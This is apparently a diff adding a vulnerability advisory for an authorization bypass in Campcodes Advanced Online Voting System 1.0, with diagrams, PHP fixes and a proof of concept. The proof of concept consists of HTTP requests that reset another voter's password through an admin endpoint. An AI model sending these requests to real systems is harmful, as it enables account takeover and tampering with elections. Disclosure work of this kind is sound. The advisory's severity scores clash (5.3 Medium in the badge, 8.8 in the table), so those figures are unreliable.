@@ -1,0 +1,158 @@
+# 🗳️ Authorization Bypass & IDOR: Campcodes Advanced Online Voting System 1.0
+
+![CVSS Score](https://img.shields.io/badge/CVSS%204.0-5.3%20Medium-yellow?style=for-the-badge)
+![Vulnerability Type](https://img.shields.io/badge/Vulnerability-IDOR%20%2F%20Auth%20Bypass-orange?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Reported-success?style=for-the-badge)
+
+> **Vulnerability:** Authorization Bypass allowing Voter-to-Voter Password Reset  
+> **Target:** Campcodes Advanced Online Voting System 1.0  
+> **Component:** Voter Management (`/votesystem/admin/voters_edit.php`)
+
+---
+
+## 🚨 Executive Summary
+
+An authorization vulnerability exists in the **Campcodes Advanced Online Voting System 1.0** that allows an authenticated low-privileged user (Voter) to access administrative endpoints. Specifically, the `/admin/voters_edit.php` endpoint fails to enforce Role-Based Access Control (RBAC).
+
+By manipulating the `id` parameter in a POST request, a voter can reset the password of **any other voter**, leading to full account takeover and a compromise of election integrity.
+
+---
+
+## 🗺️ Graphical Attack Workflow
+
+### Attack Sequence Diagram
+
+This diagram visualizes how the attacker bypasses the authorization check to modify a victim's data.
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Attacker (Voter)
+    participant Server (App)
+    participant Database
+
+    Note over Attacker (Voter): Authenticates as Normal Voter<br/>(ID: 10, Role: Voter)
+    Attacker (Voter)->>Server (App): POST /login.php
+    Server (App)-->>Attacker (Voter): 200 OK (Set PHPSESSID)
+
+    Note over Attacker (Voter): Targets Victim (ID: 8)<br/>Accesses Admin Endpoint directly
+    Attacker (Voter)->>Server (App): POST /admin/voters_edit.php<br/>Cookie: PHPSESSID<br/>Body: id=8&password=hacked123
+
+    opt VULNERABILITY (Missing RBAC)
+        Server (App)--xServer (App): ❌ Fails to check if User is Admin
+        Server (App)--xServer (App): ❌ Fails to check if ID:10 owns ID:8
+    end
+
+    Server (App)->>Database: UPDATE voters SET password='hacked123' WHERE id=8
+    Database-->>Server (App): Query Successful
+    Server (App)-->>Attacker (Voter): "Voter updated successfully"
+```
+
+---
+
+## 🛠️ Technical Details
+
+| Attribute     | Details                                                    |
+| ------------- | ---------------------------------------------------------- |
+| Product       | Campcodes Advanced Online Voting System                    |
+| Version       | 1.0                                                        |
+| Affected File | `/votesystem/admin/voters_edit.php`                        |
+| Vulnerability | Authorization Bypass / IDOR                                |
+| CWE ID        | CWE-639 (Authorization Bypass Through User-Controlled Key) |
+| CVSS v3.1     | 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)                  |
+
+### Root Cause Analysis
+
+* **Security Through Obscurity** – assumes voters will not browse `/admin/` paths.
+* **Missing Middleware** – no server-side role enforcement at admin entry points.
+* **Insecure Update Logic** – blindly trusts the `id` POST parameter.
+
+---
+
+## ⚡ Proof of Concept (PoC)
+
+### Prerequisite
+
+* Access to a normal voter account.
+
+### Step 1 – Login as Attacker
+
+```http
+POST /votesystem/login.php HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+
+voter=attacker_id&password=attacker_pass&login=
+```
+
+### Step 2 – Send Exploit Request
+
+```http
+POST /votesystem/admin/voters_edit.php HTTP/1.1
+Host: localhost
+Cookie: PHPSESSID=<VALID_VOTER_SESSION_COOKIE>
+Content-Type: application/x-www-form-urlencoded
+
+id=8&firstname=V003&lastname=V003&password=newPassword123&edit=
+```
+
+### Step 3 – Verify Takeover
+
+Attempt to authenticate as the victim using the new credentials.
+
+---
+
+## 📉 Impact Assessment
+
+### Logic Failure Flowchart
+
+```mermaid
+graph TD
+    A[User Request] --> B{Is User Logged In?}
+    B -- No --> C[Redirect to Login]
+    B -- Yes --> D{Is URL /admin/* ?}
+    D -- Yes --> E{Is Role == ADMIN?}
+
+    %% Vulnerability Highlighted
+    E -- No (Vulnerability) --> F[Allow Access & Execute Query]
+    style F fill:#f96,stroke:#333,stroke-width:2px
+
+    E -- Yes --> G[Allow Access]
+
+    F --> H[Update Arbitrary Voter Data]
+    G --> H
+```
+
+### Consequences
+
+* Horizontal Privilege Escalation
+* Account Takeover
+* Election Manipulation
+
+---
+
+## 🛡️ Remediation
+
+### Enforce Role Checks
+
+```php
+session_start();
+if($_SESSION['role'] !== 'admin'){
+    header("location: ../index.php");
+    exit;
+}
+```
+
+### Validate Ownership
+
+```php
+if($_POST['id'] != $_SESSION['user_id'] && $_SESSION['role'] != 'admin') {
+    die("Unauthorized");
+}
+```
+
+---
+
+## 👨‍💻 Credits
+
+**Discovered and Reported By:** Nitesh Kumar
